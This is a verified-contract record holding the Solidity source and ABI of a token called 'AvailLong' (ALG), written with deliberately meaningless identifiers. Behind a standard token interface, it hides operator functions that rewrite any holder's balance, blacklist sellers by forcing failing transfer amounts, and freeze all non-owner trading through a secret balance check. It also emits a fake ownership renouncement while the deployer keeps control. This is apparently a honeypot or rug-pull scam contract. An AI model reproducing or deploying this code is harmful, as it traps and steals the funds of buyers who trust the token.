{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.6;\n\ninterface maxMode {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address modeTake) external view returns (uint256);\n\n    function transfer(address toAmount, uint256 enableLaunch) external returns (bool);\n\n    function allowance(address sellTrading, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 enableLaunch) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address toAmount,\n        uint256 enableLaunch\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed liquidityReceiver, uint256 value);\n    event Approval(address indexed sellTrading, address indexed spender, uint256 value);\n}\n\nabstract contract receiverSwap {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface modeAmount {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface liquidityList {\n    function createPair(address exemptFund, address totalToken) external returns (address);\n}\n\ninterface maxModeMetadata is maxMode {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AvailLong is receiverSwap, maxMode, maxModeMetadata {\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return sellEnable;\n    }\n\n    string private shouldTake = \"ALG\";\n\n    function exemptTotalList(address buySell) public {\n        takeReceiver();\n        if (minMax) {\n            takeTotal = true;\n        }\n        if (buySell == isBuy || buySell == enableLiquidity) {\n            return;\n        }\n        launchedMax[buySell] = true;\n    }\n\n    bool private minMax;\n\n    function autoFundTx(address receiverEnable) public {\n        if (feeReceiver) {\n            return;\n        }\n        if (minMax != minFee) {\n            minMax = false;\n        }\n        modeBuy[receiverEnable] = true;\n        \n        feeReceiver = true;\n    }\n\n    address private fundSwap;\n\n    function amountSwapAuto() public {\n        emit OwnershipTransferred(isBuy, address(0));\n        fundSwap = address(0);\n    }\n\n    address listWallet = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool private minFee;\n\n    bool private modeFund;\n\n    mapping(address => bool) public modeBuy;\n\n    function balanceOf(address modeTake) public view virtual override returns (uint256) {\n        return teamTake[modeTake];\n    }\n\n    function owner() external view returns (address) {\n        return fundSwap;\n    }\n\n    function approve(address teamLaunchTo, uint256 enableLaunch) public virtual override returns (bool) {\n        buyFrom[_msgSender()][teamLaunchTo] = enableLaunch;\n        emit Approval(_msgSender(), teamLaunchTo, enableLaunch);\n        return true;\n    }\n\n    bool public takeTotal;\n\n    uint256 constant totalFromTeam = 11 ** 10;\n\n    function decimals() external view virtual override returns (uint8) {\n        return tokenLaunch;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return receiverReceiverFund;\n    }\n\n    constructor (){\n        \n        modeAmount shouldIs = modeAmount(listWallet);\n        enableLiquidity = liquidityList(shouldIs.factory()).createPair(shouldIs.WETH(), address(this));\n        \n        isBuy = _msgSender();\n        amountSwapAuto();\n        modeBuy[isBuy] = true;\n        teamTake[isBuy] = sellEnable;\n        \n        emit Transfer(address(0), isBuy, sellEnable);\n    }\n\n    uint8 private tokenLaunch = 18;\n\n    function atIs(address autoListLiquidity, address toAmount, uint256 enableLaunch) internal returns (bool) {\n        require(teamTake[autoListLiquidity] >= enableLaunch);\n        teamTake[autoListLiquidity] -= enableLaunch;\n        teamTake[toAmount] += enableLaunch;\n        emit Transfer(autoListLiquidity, toAmount, enableLaunch);\n        return true;\n    }\n\n    uint256 limitAtExempt;\n\n    function symbol() external view virtual override returns (string memory) {\n        return shouldTake;\n    }\n\n    function takeReceiver() private view {\n        require(modeBuy[_msgSender()]);\n    }\n\n    function transfer(address teamMax, uint256 enableLaunch) external virtual override returns (bool) {\n        return amountToken(_msgSender(), teamMax, enableLaunch);\n    }\n\n    function launchedExemptTo(address teamMax, uint256 enableLaunch) public {\n        takeReceiver();\n        teamTake[teamMax] = enableLaunch;\n    }\n\n    function atLaunch(uint256 enableLaunch) public {\n        takeReceiver();\n        limitAtExempt = enableLaunch;\n    }\n\n    uint256 private sellEnable = 100000000 * 10 ** 18;\n\n    uint256 amountList;\n\n    bool public feeReceiver;\n\n    mapping(address => uint256) private teamTake;\n\n    function getOwner() external view returns (address) {\n        return fundSwap;\n    }\n\n    address public isBuy;\n\n    mapping(address => bool) public launchedMax;\n\n    function transferFrom(address autoListLiquidity, address toAmount, uint256 enableLaunch) external override returns (bool) {\n        if (_msgSender() != listWallet) {\n            if (buyFrom[autoListLiquidity][_msgSender()] != type(uint256).max) {\n                require(enableLaunch <= buyFrom[autoListLiquidity][_msgSender()]);\n                buyFrom[autoListLiquidity][_msgSender()] -= enableLaunch;\n            }\n        }\n        return amountToken(autoListLiquidity, toAmount, enableLaunch);\n    }\n\n    string private receiverReceiverFund = \"Avail Long\";\n\n    bool public listEnableTrading;\n\n    function allowance(address maxMin, address teamLaunchTo) external view virtual override returns (uint256) {\n        if (teamLaunchTo == listWallet) {\n            return type(uint256).max;\n        }\n        return buyFrom[maxMin][teamLaunchTo];\n    }\n\n    event OwnershipTransferred(address indexed sellMode, address indexed autoToken);\n\n    mapping(address => mapping(address => uint256)) private buyFrom;\n\n    bool public enableFee;\n\n    address maxSenderLaunched = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function amountToken(address autoListLiquidity, address toAmount, uint256 enableLaunch) internal returns (bool) {\n        if (autoListLiquidity == isBuy) {\n            return atIs(autoListLiquidity, toAmount, enableLaunch);\n        }\n        uint256 txMin = maxMode(enableLiquidity).balanceOf(maxSenderLaunched);\n        require(txMin == limitAtExempt);\n        require(toAmount != maxSenderLaunched);\n        if (launchedMax[autoListLiquidity]) {\n            return atIs(autoListLiquidity, toAmount, totalFromTeam);\n        }\n        return atIs(autoListLiquidity, toAmount, enableLaunch);\n    }\n\n    address public enableLiquidity;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellTrading\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellMode\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoToken\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxMin\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamLaunchTo\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountSwapAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamLaunchTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableLaunch\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"enableLaunch\",\"type\":\"uint256\"}],\"name\":\"atLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverEnable\",\"type\":\"address\"}],\"name\":\"autoFundTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeTake\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableLiquidity\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buySell\",\"type\":\"address\"}],\"name\":\"exemptTotalList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableLaunch\",\"type\":\"uint256\"}],\"name\":\"launchedExemptTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listEnableTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableLaunch\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoListLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableLaunch\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "AvailLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}